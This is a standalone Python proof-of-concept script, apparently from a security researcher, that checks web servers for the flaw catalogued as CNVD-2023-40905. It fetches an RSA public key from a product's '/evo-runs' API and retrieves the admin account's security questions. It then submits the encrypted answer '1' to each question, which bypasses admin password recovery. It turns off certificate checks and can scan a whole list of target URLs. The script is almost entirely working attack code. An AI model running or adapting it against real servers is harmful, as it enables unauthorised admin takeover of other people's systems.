import argparse
import base64
import json

import requests
import rsa
import urllib3
from rsa.key import PublicKey

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def rsa_encrypt(publicKey, text):
    public_key = "-----BEGIN PUBLIC KEY-----\n" + publicKey + "\n-----END PUBLIC KEY-----"
    key = PublicKey.load_pkcs1_openssl_pem(public_key.encode())
    return base64.b64encode(rsa.encrypt(text.encode(), key)).decode()

def poc(target):
    target = target.strip("/")
    session = requests.session()
    session.verify = False
    session.headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        public = session.get(target + "/evo-runs/v1.0/auths/sysusers/publickey").json()['data']['publicKey']
        mid = session.get(target + "/evo-runs/v1.0/auths/sysusers/v2/security/questions/admin").json()['data'][
            'securityQuestions']
        salt = []
        for item in mid:
            salt.append([item, rsa_encrypt(public, "1")])
        if len(salt) != 3:
            print("[-]", target, "不存在漏洞")
            return
        payload = [{"promptKey": salt[0][0],
                    "answer": salt[0][1]},
                   {"promptKey": salt[1][0],
                    "answer": salt[1][1]},
                   {"promptKey": salt[2][0],
                    "answer": salt[2][1]}]
        result = session.post(target + "/evo-runs/v1.0/auths/sysusers/valid/security/answers/admin",
                              data=json.dumps(payload),
                              timeout=5).text
    except:
        print("[-]", target, "访问超时")
        return
    if "true" in result:
        print("[+]", target, "存在漏洞")
        return
    print("[-]", target, "不存在漏洞")


if __name__ == '__main__':
    print("""
 ██████╗███╗   ██╗██╗   ██╗██████╗       ██████╗  ██████╗ ██████╗ ██████╗       ██╗  ██╗ ██████╗  █████╗  ██████╗ ███████╗
██╔════╝████╗  ██║██║   ██║██╔══██╗      ╚════██╗██╔═████╗╚════██╗╚════██╗      ██║  ██║██╔═████╗██╔══██╗██╔═████╗██╔════╝
██║     ██╔██╗ ██║██║   ██║██║  ██║█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗███████║██║██╔██║╚██████║██║██╔██║███████╗
██║     ██║╚██╗██║╚██╗ ██╔╝██║  ██║╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚════██║████╔╝██║ ╚═══██║████╔╝██║╚════██║
╚██████╗██║ ╚████║ ╚████╔╝ ██████╔╝      ███████╗╚██████╔╝███████╗██████╔╝           ██║╚██████╔╝ █████╔╝╚██████╔╝███████║
 ╚═════╝╚═╝  ╚═══╝  ╚═══╝  ╚═════╝       ╚══════╝ ╚═════╝ ╚══════╝╚═════╝            ╚═╝ ╚═════╝  ╚════╝  ╚═════╝ ╚══════╝
                                                                                                           By: xiaoWangSec""")
    parser = argparse.ArgumentParser(description='CNVD-2023-40905验证脚本')
    parser.add_argument('-t', '--target', help='目标文本')
    parser.add_argument('-u', '--url', help='单个目标')
    args = parser.parse_args()

    if args.target:
        try:
            with open(args.target, 'r') as file:
                for line in file:
                    url = line.strip()
                    poc(url)
        except FileNotFoundError:
            print(f'文件 {args.target} 不存在')
    elif args.url:
        poc(args.url)
    else:
        parser.print_help()
